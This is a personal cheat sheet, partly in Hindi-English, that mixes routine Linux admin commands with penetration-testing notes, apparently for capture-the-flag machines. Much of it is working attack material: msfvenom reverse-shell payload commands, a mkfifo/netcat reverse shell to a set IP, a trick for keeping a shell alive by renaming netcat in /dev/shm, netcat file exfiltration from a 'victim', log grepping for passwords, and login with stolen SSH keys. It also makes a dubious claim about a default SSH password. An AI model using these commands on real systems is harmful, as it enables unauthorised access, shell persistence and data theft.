alternative of pip3 : python3 -m pip 
installing of pip:
               $ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
               $ sudo python2.7 get-pip.py
               which pip2.7
installing from .deb :: sudo gdebi ~/discord.deb :: or you can use => sudo dpkg -i file.deb
untar the file: 
tar -xvf filename.tar

taking screenshot with terminal of a web page => /usr/bin/google-chrome --headless --screenshot="chrome-ss1.png" "https://www.putorius.net" --no-sandbox
creating requirements.txt for python project =>
pipreqs /path/to/project/folder

adding 2>/dev/null at last of command will not show any error on the screen
to find a particular file at a location =>
 
 
   find / -name file_name 2>/dev/null
   for faster result => locate file_name => give the same result more fastly

default password for ssh is => CHANGEME
for reverse shell => sometimes firewall block all other ports and only allow specific ports => for both traffic going inside to network and traffic going outside to internet from the network => so always to listen on most common port like => 80 , 53 on attacker machine

To enable IP forwarding in linux => echo 1 > /proc/sys/net/ipv4/ip_forward

// if you are not getting reverse shell then their might be possiblities firewall is on ,to disable it in linux : sudo ufw disable 

searchsploit -m 34234.c                 // issse db-exploit 34234.c download ho jayega

python3 -c 'import pty; pty.spawn("/bin/bash")'    //getting interactive shell after meterpreter shell
                same task can also done by => bash -i
find / -type f -perm -u=s 2>/dev/null              // finding misconnfigure file in target sysem after meterpreter shell
su username                                        // getting user privilages with the users password....
sudo su - username                                 // switching from one user to another user with the password of our own present user...
if we have a private rsa key (/root/.ssh/id_rsa) then we can login or get a reverse shell of any machine without any password
say key file name is id_rsa 
then for getting reverse shell of machine
ssh -i id_rsa user@ip_machine
mostly cd /var/log/apache2 ke grep -r password?email password rakhta hai
isske saath saath agar /var/log mein audit bhi hai toh hamesha password: cd var/log/audit ya cd /var/log/audit.log >> cat * | grep 'COMM="Trace"' mein milaga

payload generator for windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=lhost LPORT=lport -f aspx > shell.aspx
msfvenom -p cmd/unix/reverse_netcat lhost=LHOST lport=LPORT R      // treat it like a command and use alongwith netcat listener
msfvenom -p php/meterpreter_reverse_tcp lhost=LHOST lport=53 -o meterpreter.php   // generating php reverse shell
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=172.16.64.10 lport=59919 -f elf -o shell  // generating linux exutable payload

// base64 decode
echo -n string | base64 -d


// HTTPOnly:
if set to TRUE te cookie wiil be accessible only through the HTTP protocol (the cookie will not be accessible by scripting languages). this setting can help to reduce identity theft through XSS attacks. Default is FALSE

for making script runnable from everywhere: 
ln -sf directory_of_script_alogwith_the_script_name   /usr/bin/new_name_via_which_we_want_launch_the_script
how to add directory to a path permanently:
nano /etc/environment       // edit and the path
source /etc/environment && export PATH  // run this command 
suppose we want to display files on browser then do by: 
file:///root/fil.txt

how to mount one partition to our present partition to see its content: 
1) go media and create a dir with partition name say sda1
now 
2) mount /dev/sda1 /media/sda1
now you can see all content of /dev/sda1 in /media/sda1

BURPSUIT:
burpsuite mein script ke according encode krne ke liye ctrl+U

When revrshell is got but it get died in few seconds:
it might be possible that there is any service or job running on the system which kill every process  generated by nc for connection to any other host, in that case we have to rce for cp /bin/nc /dev/shm/new_nc   basically we will cp netcat to another location  with different name on the victim and after that the serice or job which is killing the process created by nc cant kill the processes created by /dev/shm/new_nc
now rce /dev/shm/new_nc YOUR_IP PORT -e /bin/bash and enjoy the shell

downloading files from victim machine using netcat: 
prerequist : victim must have nc installed in it.,you must have a revrshell on victim and privilleges to run nc

start a nc listener on your machine : nc -nvlp 999 > name_of_file_same_as_on_victim
a listener will start listening for the data which will send to store in this file
on the victim revershell : nc IP 999 < name_of_file_same_as_on_victim
and now nc listener on attacker we will terminate and attacker will get the file name_of_file_same_as_on_victim


// ssh reverse port forwarding :and generating a public link:
ssh -R 80:192.168.43.224:80 ssh.localhost.run
after this /var/www/html
directory mein jo bhi hoga woh generated link ke through access kiya ja sakta hai, by default index.html hi run hoga 

if this not work use serveo.net:
ssh -R 80:192.168.43.224:80 serveo.net
ssh -R vaishnavas:80:192.168.43.224:80 serveo.net

// ever find ftp port open try this command for submdomain enumeration:
openssl s_client -connect crossfit.htb:21 -starttls ftp -servername crossfit.htb


// for extracting .ab (backups of mobile phones) : ( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 backup.ab ) |  tar xfvz -

Difference Between HTTP/1.0 and HTTP/1.1:
      in case of HTTP/1.0 after every single request, tcp connection will get close: "Connection: Close"
      in case of HTTP/1.1 after every single request, tcp connection will remain alive: "Connection: keep-alive"

How to Create a Cron Job => 
first check there is already any cron job or not by crontab -l => if no 
then create by => crontab -e
save it and it will run at your specified time

Process State Codes (STAT):
R running or runnable (on run queue)
D uninterruptible sleep (usually IO)
S interruptible sleep (waiting for an event to complete)
Z defunct/zombie, terminated but not reaped by its parent
T stopped, either by a job control signal or because it is being traced
Some extra modifiers:

< high-priority (not nice to other users)
N low-priority (nice to other users)
L has pages locked into memory (for real-time and custom IO)
s is a session leader
l is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)
+ is in the foreground process group


reverse shell command => rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 > /tmp/f
    and launch a nc listener at port 1234
